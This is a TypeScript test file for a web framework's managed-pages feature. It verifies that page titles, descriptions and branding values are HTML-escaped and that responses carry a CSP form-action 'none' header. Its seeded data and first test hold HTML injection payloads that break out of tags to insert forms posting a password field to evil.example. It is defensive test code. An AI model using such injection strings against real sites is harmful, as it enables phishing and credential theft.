import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createTestUser } from "@cosmicdrift/kumiko-framework/seeding";
import {
  setupTestStack,
  type TestStack,
  unsafeCreateEntityTable,
  unsafePushTables,
} from "@cosmicdrift/kumiko-testing/stack";
import { BRANDING_QN, createBrandingFeature } from "../../branding/index.ts";
import { createConfigAccessorFactory, createConfigFeature } from "../../config/feature.ts";
import { createConfigResolver } from "../../config/resolver.ts";
import { configValuesTable } from "../../config/table.ts";
import { createManagedPagesFeature } from "../feature.ts";
import { seedPage } from "../seeding.ts";
import { pageEntity } from "../table.ts";

const TENANT = "55555555-5555-4555-8555-555555555555";

// Interpolates every part naively on purpose: the parts must already be safe.
const managed = createManagedPagesFeature({
  resolveApexTenant: (host) => (host.startsWith("c.") ? TENANT : null),
  wrapLayout: (o) =>
    `<!doctype html><html lang="${o.langHtml}"><head><title>${o.titleHtml}</title><meta name="description" content="${o.descriptionHtml}">${o.brandingStyleHtml}</head><body>${o.brandingHeaderHtml}<main>${o.bodyHtml}</main></body></html>`,
});

const admin = createTestUser({ id: 40, roles: ["TenantAdmin"], tenantId: TENANT });

let stack: TestStack;

beforeAll(async () => {
  const resolver = createConfigResolver();
  stack = await setupTestStack({
    features: [createConfigFeature(), createBrandingFeature(), managed],
    anonymousAccess: { tenantExists: async (id) => id === TENANT },
    extraContext: ({ registry }) => ({
      configResolver: resolver,
      configAccessorFactory: createConfigAccessorFactory(registry, resolver),
    }),
  });
  await unsafeCreateEntityTable(stack.db, pageEntity);
  await unsafePushTables(stack.db, { configValuesTable });
  await seedPage(stack.db, {
    tenantId: TENANT,
    slug: "about",
    lang: "en",
    title: `</title><form action="https://evil.example/steal"><input name="pw">`,
    description: `"><form action="https://evil.example/d">`,
    body: "hello",
    published: true,
  });
});

afterAll(async () => {
  await stack.cleanup();
});

describe("managed-pages :: custom wrapLayout receives escaped parts", () => {
  test("hostile page and branding values never become markup", async () => {
    await stack.http.writeOk(
      "config:write:set",
      { key: BRANDING_QN.title, value: '<form action="https://evil.example/b">' },
      admin,
    );
    const res = await stack.app.request("http://c.example.com/p/about");
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).not.toContain("<form");
    expect(html).toContain("&lt;/title&gt;&lt;form");
    expect(html).toContain(
      '<span class="brand-title">&lt;form action=&quot;https://evil.example/b&quot;&gt;</span>',
    );
  });

  test("the response CSP forbids foreign form targets", async () => {
    const res = await stack.app.request("http://c.example.com/p/about");
    expect(res.headers.get("content-security-policy")).toContain("form-action 'none'");
  });
});
